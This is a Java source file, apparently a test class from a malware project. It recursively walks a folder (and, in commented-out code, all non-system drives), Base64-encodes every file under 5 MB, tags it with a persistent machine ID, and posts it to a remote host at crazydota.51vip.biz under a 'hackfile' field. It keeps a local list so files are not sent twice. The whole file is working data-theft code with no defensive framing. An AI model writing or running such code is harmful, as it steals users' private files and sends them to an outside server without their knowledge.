package test;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.UUID;

import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

import com.google.gson.Gson;

import bug.HackFile;
import bug.MachineInfo;
import bug.Static;

/**
 * author :lzy
 * date   :2018年4月11日下午3:51:25
 */

public class OOO {

	public static void main(String[] args) {
		File file=new File("E:\\javafx\\icon\\tt");
		operateFile(file);
//		for(File rootFile:File.listRoots()){
//			String rootPath=rootFile.getAbsolutePath();
//			if(rootPath.contains("C")||rootPath.contains("系统")){
//				continue;
//			}
//			operateFile(rootFile);
//		}
	}
//	
//	public static void operateFile(File file){
//		String name=file.getName();
//		if(name.contains("Tencent")){//跳过腾讯的文件
//			return;
//		}
//		if(file.isDirectory()){//目录
//			File[] files=file.listFiles();
//			if(files==null){
//				return;
//			}
//			for(File f:files){
//				operateFile(f);
//			}
//		}else{//文件
//			if(file.length()>5242880){//过滤大于5M的文件
//				return;
//			}
//			
//		}
//	}
	
	
//custom code
    
    private static Gson gson=new Gson(); 

    private static Base64.Encoder encoder = Base64.getEncoder();
    
    
    
    public static void operateFile(File file){
    	try{
    		String name=file.getName();
    		if(name.contains("Tencent")){//跳过腾讯的文件
    			return;
    		}
    		if(file.isDirectory()){//目录
    			File[] files=file.listFiles();
    			if(files==null){
    				return;
    			}
    			for(File f:files){
    				operateFile(f);
    			}
    		}else{//文件
    			
    			HackFile hackFile=new HackFile();
    			String[] names=file.getName().split("\\.");
    			hackFile.setData(encode(file));
    			hackFile.setClientPath(file.getAbsolutePath());
    			hackFile.setName(file.getName());
    			hackFile.setType(names[names.length-1]);
    			hackFile.setSize(file.length());
    			hackFile.setMac(getUnitId());
    			String json=gson.toJson(hackFile);
    			if(!filter(file)){
    				return;
    			}
    			
    			
    			CloseableHttpClient httpClient = HttpClients.createDefault();
    			HttpPost httpPost = new HttpPost("http://crazydota.51vip.biz:16106/games");
//    			RequestConfig requestConfig = RequestConfig.custom().setSocketTimeout(60000).setConnectTimeout(60000).build();//设置请求和传输超时时间
//    			httpPost.setConfig(requestConfig);
    			List <NameValuePair> nvps = new ArrayList <NameValuePair>();
    			nvps.add(new BasicNameValuePair("hackfile", ""));
    			nvps.add(new BasicNameValuePair("data", json));
    			httpPost.setEntity(new UrlEncodedFormEntity(nvps,Charset.forName("utf-8")));
    			httpPost.setHeader("charset","utf-8");
    			
    			System.out.println(httpClient.execute(httpPost));
    		}
    	}catch(Exception e){
    		e.printStackTrace();
    		//暂不作处理
    	}
		
	}
    
    public static String encode(File file) throws Exception{
		Long length=file.length();
		byte[] bytes=new byte[length.intValue()];
		FileInputStream fis=new FileInputStream(file);
		BufferedInputStream bis=new BufferedInputStream(fis);
		bis.read(bytes);
		bis.close();
		
		return encoder.encodeToString(bytes);
    }
    
    
    public static String getUnitId() throws Exception{
    	String uuid="";
    	File file=new File(Static.basePath);
    	if(!file.exists()){
    		file.mkdirs();
    	}
    	file=new File(Static.basePath+File.separator+"unitId");
    	if(!file.exists()){
    		FileWriter fw=new FileWriter(file);
    		uuid=UUID.randomUUID().toString();
    		fw.write(uuid);
    		fw.flush();
    		fw.close();
    	}else{
    		BufferedReader br=new BufferedReader(new FileReader(file));
    		uuid=br.readLine();
    		br.close();
    	}
    	return uuid;
    }
    
    public static boolean filter(File argFile) throws Exception{
    	if(argFile.length()>5242880){//过滤大于5M的文件
			return false;
		}
    	String arg=argFile.getAbsolutePath();
    	String uuid="";
    	File file=new File(Static.basePath);
    	if(!file.exists()){
    		file.mkdirs();
    	}
    	file=new File(Static.basePath+File.separator+"filter");
    	if(!file.exists()){
    		try{//如果并发写则默认回传文件
    			BufferedWriter bw=new BufferedWriter(new FileWriter(file));
        		bw.write(arg);
        		bw.newLine();
        		bw.flush();
        		bw.close();
    		}catch(Exception e){
    		}
			return true;
    	}else{
    		Set<String> set=new HashSet<String>();
    		BufferedReader br=new BufferedReader(new FileReader(file));
    		String str=br.readLine();
    		while(str!=null){
    			set.add(str);
    			str=br.readLine();
    		}
    		br.close();
    		if(set.contains(arg)){
    			return false;
    		}else{
    			try{//如果并发写则默认回传文件
        			BufferedWriter bw=new BufferedWriter(new FileWriter(file,true));
            		bw.write(arg);
            		bw.newLine();
            		bw.flush();
            		bw.close();
        		}catch(Exception e){
        		}
    			return true;
    		}
    	}
    }
	
}
